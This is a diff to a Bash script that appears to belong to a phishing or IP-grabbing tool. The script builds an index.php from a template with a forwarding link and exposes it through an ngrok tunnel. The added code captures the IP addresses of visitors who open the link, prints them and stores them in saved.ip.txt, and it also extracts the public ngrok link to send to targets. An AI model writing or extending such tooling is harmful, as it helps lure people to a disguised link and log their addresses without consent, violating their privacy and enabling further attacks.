@@ -41,6 +41,17 @@ sed 's+forwarding_link+'$link'+g' template.php > index.php
 
 }
 
+catch_ip() {
+
+ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
+IFS=$'\n'
+printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
+
+cat ip.txt >> saved.ip.txt
+
+
+}
+
 checkfound() {
 
 printf "\n"
@@ -107,6 +118,9 @@ ngrok_info=$(curl -s http://localhost:4040/api/tunnels)
 ngrok_url=$(echo "$ngrok_info" | jq -r '.tunnels[0].public_url')
 
 echo "El enlace de Ngrok es: $ngrok_url"
+
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
 
 payload_ngrok
 checkfound
